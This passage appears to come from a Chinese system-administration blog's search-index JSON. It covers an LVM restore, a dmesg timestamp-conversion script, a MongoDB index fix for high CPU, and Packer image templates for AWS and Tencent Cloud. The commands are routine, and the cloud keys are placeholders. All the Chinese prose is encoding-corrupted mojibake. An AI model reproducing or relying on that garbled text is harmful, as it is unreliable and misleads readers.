data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003epvcreate --uuid \u003cspan class=\"s2\"\u003e\u0026#34;BgR0KJ-JClh-T2gS-k6yK-9RGn-B8Ls-LYPQP0\u0026#34;\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e  --restorefile /etc/lvm/archive/vg_storage_00677-187019982.vg\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"ä¸‰æ¢å¤vg\"\u003eä¸‰ã€æ¢å¤VG\u003c/h4\u003e\n\u003cp\u003eå¦‚æœ vg æ˜¯æ­£å¸¸çš„ï¼Œé‚£ä¹ˆå°±ä¸ç”¨åšç¬¬äºŒæ­¥äº†ï¼Œç›´æ¥ä»å¤‡ä»½ä¸­æ¢å¤å³å¯ï¼Œå…ˆæŸ¥çœ‹ä¸€ä¸‹\u003c/p\u003e","title":"LVMç³»ç»Ÿçš„Restore"},{"content":"ç°åœ¨ç‰ˆæœ¬çš„ dmesg -T éƒ½æ˜¯å¸¦æ—¶é—´æˆ³çš„ã€‚\nä½†æ˜¯è€çš„æœºå™¨ï¼Œå¾ˆæœ‰å¯èƒ½æ˜¯æ²¡æœ‰ -T è¿™ä¸ªå‚æ•°çš„ï¼Œç›´æ¥ dmesg æ˜¯è¿™æ ·çš„ï¼š\nè¿™ä¸ªæ—¶é—´æˆ³æ˜¯å¤©ä¹¦å•Šï¼Œè¿™è¿˜ç®—å¥½çš„ï¼Œå¥½æ­¹æœ‰ã€‚è¿˜æœ‰æ›´å·®çš„ï¼Œè¿æˆ³å­éƒ½æ²¡æœ‰ï¼š\næˆ³å­éƒ½æ²¡æœ‰çš„ï¼Œéœ€è¦åšä»¥ä¸‹æ­¥éª¤æ¥åŠ ä¸Šï¼Œæœºå™¨é‡å¯åå¿…é¡»å†æ‰§è¡Œä¸€éï¼š\necho 1 \u0026gt; /sys/module/printk/parameters/printk_time åŒæ—¶å†™ä¸ªè„šæœ¬ï¼Œ/usr/local/bin/dmesgt.sh\n#!/bin/bash # Translate dmesg timestamps to human readable format # desired date format date_format=\u0026#34;%a %b %d %T %Y\u0026#34; # uptime in seconds uptime=$(cut -d \u0026#34; \u0026#34; -f 1 /proc/uptime) # run only if timestamps are enabled if [ \u0026#34;Y\u0026#34; = \u0026#34;$(cat /sys/module/printk/parameters/time)\u0026#34; ]; then dmesg | sed \u0026#34;s/^\\[[ ]*\\?\\([0-9.]*\\)\\] \\(.*\\)/\\\\1 \\\\2/\u0026#34; | while read timestamp message; do printf \u0026#34;[%s] %s\\n\u0026#34; \u0026#34;$(date --date \u0026#34;now - $uptime seconds + $timestamp seconds\u0026#34; +\u0026#34;${date_format}\u0026#34;)\u0026#34; \u0026#34;$message\u0026#34; done else echo \u0026#34;Timestamps are disabled (/sys/module/printk/parameters/time)\u0026#34; fi è¿™æ ·å°±å¯ä»¥äº†ï¼Œæœ€åæˆ‘ä»¬æµ‹è¯•ä¸€ä¸‹ï¼š\necho \u0026#34;Enabled timestamps\u0026#34; | tee /dev/kmsg çœ‹åˆ°å¸¦æ—¶é—´æˆ³çš„ä¿¡æ¯å°±å¯ä»¥äº†ï¼š\n$ dmesg [...] Bluetooth: RFCOMM TTY layer initialized Bluetooth: RFCOMM socket layer initialized Bluetooth: RFCOMM ver 1.11 [...] [271309.434405] Enabled timestamps [...] ","permalink":"https://rendoumi.com/posts/20220725-dmesg_time/","summary":"\u003cp\u003eç°åœ¨ç‰ˆæœ¬çš„ dmesg -T éƒ½æ˜¯å¸¦æ—¶é—´æˆ³çš„ã€‚\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20220725172454313\" loading=\"lazy\" src=\"/posts/20220725-dmesg_time/image-20220725172454313.png\"\u003e\u003c/p\u003e\n\u003cp\u003eä½†æ˜¯è€çš„æœºå™¨ï¼Œå¾ˆæœ‰å¯èƒ½æ˜¯æ²¡æœ‰ -T è¿™ä¸ªå‚æ•°çš„ï¼Œç›´æ¥ dmesg æ˜¯è¿™æ ·çš„ï¼š\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20220725172554722\" loading=\"lazy\" src=\"/posts/20220725-dmesg_time/image-20220725172554722.png\"\u003e\u003c/p\u003e\n\u003cp\u003eè¿™ä¸ªæ—¶é—´æˆ³æ˜¯å¤©ä¹¦å•Šï¼Œè¿™è¿˜ç®—å¥½çš„ï¼Œå¥½æ­¹æœ‰ã€‚è¿˜æœ‰æ›´å·®çš„ï¼Œè¿æˆ³å­éƒ½æ²¡æœ‰ï¼š\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20220725172816958\" loading=\"lazy\" src=\"/posts/20220725-dmesg_time/image-20220725172816958.png\"\u003e\u003c/p\u003e\n\u003cp\u003eæˆ³å­éƒ½æ²¡æœ‰çš„ï¼Œéœ€è¦åšä»¥ä¸‹æ­¥éª¤æ¥åŠ ä¸Šï¼Œæœºå™¨é‡å¯åå¿…é¡»å†æ‰§è¡Œä¸€éï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"m\"\u003e1\u003c/span\u003e \u0026gt; /sys/module/printk/parameters/printk_time\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eåŒæ—¶å†™ä¸ªè„šæœ¬ï¼Œ/usr/local/bin/dmesgt.sh\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#!/bin/bash\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003e\u003cspan class=\"c1\"\u003e# Translate dmesg timestamps to human readable format\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# desired date format\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003edate_format\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;%a %b %d %T %Y\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# uptime in seconds\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003euptime\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"k\"\u003e$(\u003c/span\u003ecut -d \u003cspan class=\"s2\"\u003e\u0026#34; \u0026#34;\u003c/span\u003e -f \u003cspan class=\"m\"\u003e1\u003c/span\u003e /proc/uptime\u003cspan class=\"k\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# run only if timestamps are enabled\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e[\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;Y\u0026#34;\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"k\"\u003e$(\u003c/span\u003ecat /sys/module/printk/parameters/time\u003cspan class=\"k\"\u003e)\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e \u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"k\"\u003ethen\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  dmesg \u003cspan class=\"p\"\u003e|\u003c/span\u003e sed \u003cspan class=\"s2\"\u003e\u0026#34;s/^\\[[ ]*\\?\\([0-9.]*\\)\\] \\(.*\\)/\\\\1 \\\\2/\u0026#34;\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e \u003cspan class=\"k\"\u003ewhile\u003c/span\u003e \u003cspan class=\"nb\"\u003eread\u003c/span\u003e timestamp message\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"k\"\u003edo\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eprintf\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;[%s] %s\\n\u0026#34;\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"k\"\u003e$(\u003c/span\u003edate --date \u003cspan class=\"s2\"\u003e\u0026#34;now - \u003c/span\u003e\u003cspan class=\"nv\"\u003e$uptime\u003c/span\u003e\u003cspan class=\"s2\"\u003e seconds + \u003c/span\u003e\u003cspan class=\"nv\"\u003e$timestamp\u003c/span\u003e\u003cspan class=\"s2\"\u003e seconds\u0026#34;\u003c/span\u003e +\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003edate_format\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"k\"\u003e)\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$message\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"k\"\u003edone\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003eelse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;Timestamps are disabled (/sys/module/printk/parameters/time)\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003efi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eè¿™æ ·å°±å¯ä»¥äº†ï¼Œæœ€åæˆ‘ä»¬æµ‹è¯•ä¸€ä¸‹ï¼š\u003c/p\u003e","title":"dmesg -T æ— æ—¶é—´æˆ³çš„è§£å†³æ–¹æ³•"},{"content":"æ¥åˆ°åŒäº‹çš„é€šçŸ¥ï¼Œè¯´mongodbçš„cpuå¾ˆé«˜ï¼Œä¸‹ä¸å»ï¼Œçœ‹æœ‰ä»€ä¹ˆåŠæ³•ã€‚\nçœ‹äº†ä¸€ä¸‹å›¾ï¼Œcpuéƒ½99.4%äº†ï¼Œç¡®å®å¾ˆé«˜ï¼š\nç™»ä¸Šæœºå™¨ï¼Œé¦–å…ˆå»çœ‹mongodçš„logï¼Œéƒ½è¯•å¦‚ä¸‹çš„æŸ¥è¯¢ï¼Œéƒ½å¾ˆæ…¢ï¼š\ncopyå‡ºä¸€æ¡æ¥ï¼Œå¤‡ç”¨\n2022-07-17T21:30:42.556+0800 I COMMAND [conn196670] command beyou.behaviorAnalysis command: find { find: \u0026#34;behaviorAnalysis\u0026#34;, filter: { behavior: { $regex: \u0026#34;.*äº’åŠ¨æ“ä½œ.*\u0026#34;, $options: \u0026#34;i\u0026#34; }, log: { $regex: \u0026#34;.*\\Qè§‚çœ‹ï¼šã€Šç½—é©¬çš„æˆ¿å­ã€‹,\\E.*\u0026#34;, $options: \u0026#34;i\u0026#34; }, userId: 7345, _class: { $in: [ \u0026#34;com.linkyee.api.domain.po.BehaviorAnalysis\u0026#34; ] } }, $db: \u0026#34;beyou\u0026#34; } planSummary: IXSCAN { _class: 1, behavior: 1, log: 1, userId: 1 } keysExamined:111564 docsExamined:2 cursorExhausted:1 numYields:890 nreturned:2 reslen:571 locks:{ Global: { acquireCount: { r: 891 } }, Database: { acquireCount: { r: 891 } }, Collection: { acquireCount: { r: 891 } } } storage:{} protocol:op_msg 2268ms å‘ç°ç¡®å®å¾ˆæ…¢å•Šï¼Œop_msg å±…ç„¶è¦2268msï¼Œä½†æ˜¯mongodbçš„æ•°æ®ç›®å½•æ€»å…±æ‰6Gå¤šï¼Œä¸å®¢è§‚å•Šã€‚\nçœ‹çœ‹è¡¨ç»“æ„å’Œç´¢å¼•ï¼š\n\u0026gt; show dbs; admin 0.000GB beyou 0.063GB config 0.000GB local 0.000GB \u0026gt; use beyou; switched to db beyou \u0026gt; show collections; activityLog behaviorAnalysis \u0026gt; db.behaviorAnalysis.find({},{_id:0}).limit(1); { \u0026#34;name\u0026#34; : \u0026#34;812304163055734784\u0026#34;, \u0026#34;createTime\u0026#34; : ISODate(\u0026#34;2022-02-19T12:46:44.360Z\u0026#34;), \u0026#34;behavior\u0026#34; : \u0026#34;äº’åŠ¨æ“ä½œ\u0026#34;, \u0026#34;log\u0026#34; : \u0026#34;åŠ å…¥çœ‹å•ï¼šã€Šçˆ±çš„è¿«é™ã€‹\u0026#34;, \u0026#34;userId\u0026#34; : 2, \u0026#34;_class\u0026#34; : \u0026#34;com.linkyee.api.domain.po.BehaviorAnalysis\u0026#34; } \u0026gt; db.behaviorAnalysis.getIndexes(); [ { \u0026#34;v\u0026#34; : 2, \u0026#34;key\u0026#34; : { \u0026#34;_id\u0026#34; : 1 }, \u0026#34;name\u0026#34; : \u0026#34;_id_\u0026#34;, \u0026#34;ns\u0026#34; : \u0026#34;beyou.behaviorAnalysis\u0026#34; }, { \u0026#34;v\u0026#34; : 2, \u0026#34;key\u0026#34; : { \u0026#34;_class\u0026#34; : 1, \u0026#34;behavior\u0026#34; : 1, \u0026#34;log\u0026#34; : 1, \u0026#34;userId\u0026#34; : 1 }, \u0026#34;name\u0026#34; : \u0026#34;_class_1_behavior_1_log_1_userId_1\u0026#34;, \u0026#34;ns\u0026#34; : \u0026#34;beyou.behaviorAnalysis\u0026#34; } ] å‘ç°è¡¨ç»“æ„ä¸å¤æ‚ï¼Œç´¢å¼•å‘¢æœ‰ä¸¤ä¸ªï¼Œä¸€ä¸ªç¼ºçœçš„å•å­—æ®µç´¢å¼•_idï¼Œå¦ä¸€ä¸ªæ˜¯å¤šå­—æ®µç´¢å¼•ï¼Œ4åˆä¸€çš„ï¼ˆ _classã€behaviorã€logã€userId ï¼‰\nç»§ç»­ï¼Œæ¥çœ‹çœ‹æŸ¥è¯¢ï¼š\nfind { find: \u0026#34;behaviorAnalysis\u0026#34;, filter: { behavior: { $regex: \u0026#34;.*äº’åŠ¨æ“ä½œ.*\u0026#34;, $options: \u0026#34;i\u0026#34; }, log: { $regex: \u0026#34;.*\\Qè§‚çœ‹ï¼šã€Šç½—é©¬çš„æˆ¿å­ã€‹,\\E.*\u0026#34;, $options: \u0026#34;i\u0026#34; }, userId: 7345, _class: { $in: [ \u0026#34;com.linkyee.api.domain.po.BehaviorAnalysis\u0026#34; ] } }, $db: \u0026#34;beyou\u0026#34; } planSummary: IXSCAN { _class: 1, behavior: 1, log: 1, userId: 1 } keysExamined:111564 planSummaryé‡Œï¼ŒIXSCANæ˜¯æŸ¥äº†ç´¢å¼•ï¼Œä½†æ˜¯keyExaminedå±…ç„¶æœ‰111564ä¸ªï¼Œå¤ªå¤šäº†å§ã€‚\nå†çœ‹çœ‹ç´¢å¼•ï¼Œæ˜æ˜¾4åˆä¸€çš„æ•ˆç‡æœ‰é—®é¢˜ã€‚\né‚£å°±ç®€å•äº†ï¼Œåˆ æ‰è¿™ä¸ª4åˆä¸€çš„ç´¢å¼•ï¼Œæ–°å»ºä¸€ä¸ªuserIdçš„ç´¢å¼•ï¼Œæ—¢ç„¶å«userIdï¼Œé‚£æ¨æµ‹å®ƒæ˜¯å”¯ä¸€çš„ï¼Œé‡å»ºç´¢å¼•éœ€è¦åå°æ‰§è¡Œï¼Œå¹¶ä¸”åœ¨ä¸šåŠ¡ä¸ç¹å¿™çš„æ—¶å€™å†è·‘\ndb.behaviorAnalysis.createIndex({\u0026#34;userId\u0026#34;:1},{\u0026#34;name\u0026#34;:\u0026#39;idx_userId\u0026#39;,background:true,unique:true}); åŒäº‹æ‰§è¡Œçš„æ—¶å€™æŠ¥é”™ï¼š\nå±…ç„¶keyé‡å¤äº†ï¼Œé‚£å°±æŠŠ unique:true å»æ‰äº†å†æ‰§è¡Œï¼Œå°±æˆåŠŸäº†ã€‚\nç„¶åcpuå°±ç«‹ç«¿è§å½±ï¼Œä»100%é™ä½åˆ°äº†2.8%\noverï¼Œå¦‚æœå†é‡åˆ°ç“¶é¢ˆï¼Œä¼°è®¡å°±åªèƒ½é‡‡ç”¨åˆ†ç‰‡å¤§æ³•äº†ã€‚\n","permalink":"https://rendoumi.com/posts/20220721-mongodb_cpu/","summary":"\u003cp\u003eæ¥åˆ°åŒäº‹çš„é€šçŸ¥ï¼Œè¯´mongodbçš„cpuå¾ˆé«˜ï¼Œä¸‹ä¸å»ï¼Œçœ‹æœ‰ä»€ä¹ˆåŠæ³•ã€‚\u003c/p\u003e\n\u003cp\u003eçœ‹äº†ä¸€ä¸‹å›¾ï¼Œcpuéƒ½99.4%äº†ï¼Œç¡®å®å¾ˆé«˜ï¼š\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20220721152856848\" loading=\"lazy\" src=\"/posts/20220721-mongodb_cpu/image-20220721152856848.png\"\u003e\u003c/p\u003e\n\u003cp\u003eç™»ä¸Šæœºå™¨ï¼Œé¦–å…ˆå»çœ‹mongodçš„logï¼Œéƒ½è¯•å¦‚ä¸‹çš„æŸ¥è¯¢ï¼Œéƒ½å¾ˆæ…¢ï¼š\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20220721153814123\" loading=\"lazy\" src=\"/posts/20220721-mongodb_cpu/image-20220721153814123.png\"\u003e\u003c/p\u003e\n\u003cp\u003ecopyå‡ºä¸€æ¡æ¥ï¼Œå¤‡ç”¨\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode class=\"language-log\" data-lang=\"log\"\u003e2022-07-17T21:30:42.556+0800 I COMMAND  [conn196670] command beyou.behaviorAnalysis command: find { find: \u0026#34;behaviorAnalysis\u0026#34;, filter: { behavior: { $regex: \u0026#34;.*äº’åŠ¨æ“ä½œ.*\u0026#34;, $options: \u0026#34;i\u0026#34; }, log: { $regex: \u0026#34;.*\\Qè§‚çœ‹ï¼šã€Šç½—é©¬çš„æˆ¿å­ã€‹,\\E.*\u0026#34;, $options: \u0026#34;i\u0026#34; }, userId: 7345, _class: { $in: [ \u0026#34;com.linkyee.api.domain.po.BehaviorAnalysis\u0026#34; ] } }, $db: \u0026#34;beyou\u0026#34; } planSummary: IXSCAN { _class: 1, behavior: 1, log: 1, userId: 1 } keysExamined:111564 docsExamined:2 cursorExhausted:1 numYields:890 nreturned:2 reslen:571 locks:{ Global: { acquireCount: { r: 891 } }, Database: { acquireCount: { r: 891 } }, Collection: { acquireCount: { r: 891 } } } storage:{} protocol:op_msg 2268ms\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eå‘ç°ç¡®å®å¾ˆæ…¢å•Šï¼Œop_msg å±…ç„¶è¦2268msï¼Œä½†æ˜¯mongodbçš„æ•°æ®ç›®å½•æ€»å…±æ‰6Gå¤šï¼Œä¸å®¢è§‚å•Šã€‚\u003c/p\u003e","title":"ä¸€æ¬¡mongodb cpuå¾ˆhighçš„è§£å†³æ–¹æ³•"},{"content":"å…ˆæ™®åŠä¸€ä¸‹æ¦‚å¿µï¼ŒInfrastructure as Codeï¼Œä¹Ÿå°±æ˜¯ä»ä»£ç å¼€å§‹å®šä¹‰æ•´ä¸ªç½‘ç»œç¯å¢ƒã€è™šæœºã€å„ç§èµ„æºç­‰ç­‰ã€‚\nç®€å•è¯´å°±æ˜¯åœ¨äº‘ä¸Šç”¨ä»£ç æ¥ç®¡ç†ä¸€åˆ‡ï¼Œæ— è®ºæ˜¯vpcã€subnetworkã€lbã€snatã€sgã€ec2\u0026hellip;\u0026hellip;\néå¸¸ç¬¦åˆæˆ‘çš„èƒƒå£ï¼Œå› ä¸ºå°±è¿æ¶æ„å›¾ï¼Œéƒ½æ˜¯ç”¨ graphviz æ¥ç”»çš„ã€‚\né‚£ä¹ˆ Infrastructure as Code ï¼ˆIACï¼‰ å¯ä»¥åˆ†ä¸ºä»¥ä¸‹äº”ä¸ªéƒ¨åˆ†ï¼š\nAd hoc scripts Configuration Management tools Orchestration tools Provisioning tools Server Templating tools ä¸€ã€Ad hoc scripts å°±æ˜¯ç”¨è½¯ä»¶å¯¹ç›®çš„ä¸»æœºè¿›è¡Œ point to point æ“ä½œï¼Œç”¨shellæˆ–è€…ansibleéƒ½å¯ä»¥ã€‚æ¨èansibleã€‚\nåœ¨ infosys é¢è¯•è¢«ä¸€ä¸ªå°åº¦è€å¤–é—®åˆ°è¿™é—®é¢˜ï¼Œå› ä¸ºå¹³æ—¶æ ¹æœ¬ä¸ç”¨ansible çš„ ad hoc ç‚¹å¯¹ç‚¹æ¨¡å¼ï¼Œç»“æœè¢«å½“åœºé—®ä½ã€‚ç°åœ¨æ‰çŸ¥é“è¿™ç©æ„æ˜¯ä»€ä¹ˆã€‚å½“ç„¶ï¼Œç”¨ ansible çš„è¯ä¸å»ºè®®ç”¨è¿™ä¸ªï¼Œå› ä¸º playbook æ˜¯å¯è¿½æº¯çš„ã€‚\näºŒã€Configuration Management tools é…ç½®ç®¡ç†ï¼Œè¿™é‡Œå½“ç„¶æ¨è ansibleï¼Œæ¯ä¸€æ­¥çš„æ“ä½œéƒ½å¯ä»¥æœ‰ inventory å’Œ playbook å¯ä»¥è¿½æº¯ã€‚\nä¸‰ã€Orchestration tools ååŒå·¥å…·ï¼Œk8så’Œkvm\nå››ã€Provisioning tools ç”Ÿäº§å·¥å…·ï¼Œå½“ç„¶æ˜¯terraformï¼Œå¦å¤–ï¼Œé˜¿é‡Œäº‘æ˜¯æ”¯æŒplumiçš„ï¼Œåä¸ºè…¾è®¯ä¸æ”¯æŒã€‚\näº”ã€Server Templating tools æ¨¡æ¿å·¥å…·ï¼Œè¿™é‡Œå°±æ˜¯ Packerï¼Œå…¶å®æˆ‘ä»¬å…¬å¸ç°åœ¨çš„æ¨¡æ¿å·¥å…·ï¼Œæ˜¯å…«æˆ’ä»openstackå­¦çš„ï¼Œæ”¹åŠ¨Cloud-initçš„ä¸œè¥¿ã€‚\nPackeræ›´æ ‡å‡†ä¸€ä¸‹ï¼Œæ˜¯è¿›åŒ–ç‰ˆçš„ä¸œè¥¿ï¼Œå®ƒæ—¢å¯ä»¥æ‰“kvmé•œåƒï¼Œä¹Ÿå¯ä»¥æ‰“Dockeré•œåƒã€‚\nä¸‹é¢æˆ‘ä»¬å°±çœ‹çœ‹æ€ä¹ˆä½¿ç”¨å§ï¼Œè¿™é‡Œå…ˆè¯´kvmï¼Œå› ä¸ºkvmçš„æ¯”è¾ƒéš¾ï¼Œdockerçš„å…«æˆ’ç°åœ¨è¿˜æ˜¯ç”¨Dockerfileï¼Œæœ‰ç©ºäº†å†ç ”ç©¶packerï¼š\nå®‰è£…å°±ä¸å¤šè¯´äº†ï¼Œå°±ä¸€ä¸ªæ‰§è¡Œæ–‡ä»¶ï¼Œä¸‹è½½ä¸‹æ¥å°±è¡Œï¼Œä¸ç”¨è£…ã€‚\nPackerçš„æ ¸å¿ƒæ˜¯ä¸‰ä¸ªéƒ¨åˆ†\nbuilders provisioners post-processors æˆ‘ä»¬å…ˆå»ºç«‹ä¸€ä¸ªç©ºç›®å½•ï¼Œåå­—éšä¾¿ï¼Œå°±å« test-image\nmkdir test-images cd test-image ç„¶ååœ¨ç›®å½•ä¸‹é¢ï¼Œå»ºç«‹ä¸‰ä¸ªæ–‡ä»¶ï¼š\npacker.json, variable.json, setup.sh\né¦–å…ˆçœ‹variable.jsonï¼Œå¯¹åº”AWSé•¿è¿™æ ·\n{ \u0026#34;description\u0026#34;: \u0026#34;test image\u0026#34;, \u0026#34;access_key\u0026#34;: \u0026#34;enter-aws-your-key\u0026#34;, \u0026#34;secret_key\u0026#34;: \u0026#34;enter-aws-your-secret\u0026#34; \u0026#34;source_ami\u0026#34;: \u0026#34;enter-yours\u0026#34; } å¯¹åº”è…¾è®¯äº‘å°±æ˜¯è¿™æ ·\n{ \u0026#34;description\u0026#34;: \u0026#34;test image\u0026#34;, \u0026#34;tc_secret_id\u0026#34;: \u0026#34;TENCENTCLOUD_ACCESS_KEY\u0026#34;, \u0026#34;tc_secret_key\u0026#34;: \u0026#34;TENCENTCLOUD_SECRET_KEY\u0026#34;, \u0026#34;source_tc\u0026#34;: \u0026#34;enter-yours\u0026#34; } ç¨å¾®è§£é‡Šä¸€ä¸‹ï¼Œæ— è®ºå“ªå®¶äº‘ï¼Œä½ éƒ½éœ€è¦å»ç”³è¯·secretçš„keyï¼Œæ‰å¯ä»¥ç”¨ï¼Œç„¶åå°±æ˜¯source_amiå’Œsource_tcäº†ï¼Œè¿™ä¸ªæŒ‡é•œåƒçš„æ¯ç‰ˆ\nawsçš„é•¿è¿™æ ·ï¼š\nè…¾è®¯çš„é•¿è¿™æ ·ï¼š\nokï¼Œå˜é‡éƒ½å®šä¹‰å¥½äº†ã€‚\nä¸‹é¢æ˜¯packer.jsonçš„æ­£æ–‡\nawsçš„è¿™æ ·ï¼š\n{ \u0026#34;builders\u0026#34;: [ { \u0026#34;type\u0026#34;: \u0026#34;amazon-ebs\u0026#34;, \u0026#34;access_key\u0026#34;: \u0026#34;{{user `access_key` }}\u0026#34;, \u0026#34;secret_key\u0026#34;: \u0026#34;{{user `secret_key` }}\u0026#34;, \u0026#34;region\u0026#34; : \u0026#34;us-east-1\u0026#34;, \u0026#34;ami_name\u0026#34; : \u0026#34;myfirstami\u0026#34;, \u0026#34;source_ami\u0026#34; : \u0026#34;{{user `source_ami` }}\u0026#34;, \u0026#34;instance_type\u0026#34; : \u0026#34;t2.micro\u0026#34;, \u0026#34;ssh_username\u0026#34; : \u0026#34;ec2-user\u0026#34; } ], \u0026#34;provisioners\u0026#34;: [ { \u0026#34;type\u0026#34;: \u0026#34;shell\u0026#34;, \u0026#34;script\u0026#34;: \u0026#34;setup.sh\u0026#34; } ], \u0026#34;post-processors\u0026#34;: [ { \u0026#34;type\u0026#34;: \u0026#34;manifest\u0026#34;, \u0026#34;output\u0026#34;: \u0026#34;out.json\u0026#34; } ] } çœ‹è§äº†å§ï¼Œæ ¸å¿ƒä¸‰éƒ¨åˆ†ã€‚é‚£ä¹ˆæ¢æˆè…¾è®¯ï¼Œå°±é•¿è¿™æ ·\n{ \u0026#34;builders\u0026#34;: [ { \u0026#34;type\u0026#34;: \u0026#34;tencentcloud-cvm\u0026#34;, \u0026#34;secret_id\u0026#34;: \u0026#34;{{user `tc_secret_id`}}\u0026#34;, \u0026#34;secret_key\u0026#34;: \u0026#34;{{user `tc_secret_key`}}\u0026#34;, \u0026#34;region\u0026#34;: \u0026#34;ap-guangzhou\u0026#34;, \u0026#34;zone\u0026#34;: \u0026#34;ap-guangzhou-3\u0026#34;, \u0026#34;instance_type\u0026#34;: \u0026#34;S2.SMALL1\u0026#34;, \u0026#34;disk_type\u0026#34;: \u0026#34;CLOUD_PREMIUM\u0026#34;, \u0026#34;associate_public_ip_address\u0026#34;: true, \u0026#34;image_name\u0026#34;: \u0026#34;myfirsttc\u0026#34;, \u0026#34;source_image_id\u0026#34;: \u0026#34;{{user `source_tc` }}\u0026#34;, \u0026#34;ssh_username\u0026#34; : \u0026#34;root\u0026#34; } ], \u0026#34;provisioners\u0026#34;: [ { \u0026#34;type\u0026#34;: \u0026#34;shell\u0026#34;, \u0026#34;script\u0026#34;: \u0026#34;setup.sh\u0026#34; } ], \u0026#34;post-processors\u0026#34;: [ { \u0026#34;type\u0026#34;: \u0026#34;manifest\u0026#34;, \u0026#34;output\u0026#34;: 